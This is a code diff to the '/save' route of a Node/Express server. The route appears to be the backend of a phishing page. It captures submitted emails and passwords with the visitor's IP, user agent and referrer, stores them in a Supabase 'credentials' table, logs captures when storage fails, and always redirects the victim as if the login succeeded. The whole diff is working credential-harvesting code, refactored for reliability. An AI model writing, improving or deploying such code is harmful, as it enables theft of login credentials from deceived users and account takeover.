@@ -106,37 +106,31 @@ app.post('/save', async (req, res) => {
   const userAgent = req.get('User-Agent');
   const referrer = req.get('Referer');
 
-  console.log('Save attempt for:', email, 'Supabase available:', !!supabase);
+  const credentialData = { email, password, timestamp, ip, user_agent: userAgent, referrer };
+  let saved = false;
 
-  // Try to save to database if configured
+  // Try to save to Supabase if configured
   if (supabase) {
     try {
       const { data, error } = await supabase
         .from('credentials')
-        .insert([
-          {
-            email,
-            password,
-            timestamp,
-            ip,
-            user_agent: userAgent,
-            referrer
-          }
-        ]);
+        .insert([credentialData]);
 
       if (error) {
         console.error('Supabase error:', error);
-        // Log but don't fail - still redirect
       } else {
-        console.log('Credentials saved successfully to Supabase', data);
+        console.log('Credentials saved to Supabase');
+        saved = true;
       }
     } catch (error) {
       console.error('Exception saving to Supabase:', error.message);
-      // Log but don't fail - still redirect
     }
   } else {
-    console.warn('Supabase not configured - credentials cannot be saved to database');
-    console.warn('Please set SUPABASE_URL and SUPABASE_ANON_KEY environment variables on Vercel');
+    console.warn('Supabase not configured - please set SUPABASE_URL and SUPABASE_ANON_KEY on Vercel');
+  }
+
+  if (!saved) {
+    console.log('Credential captured (Supabase offline):', email);
   }
 
   // Always return success and redirect
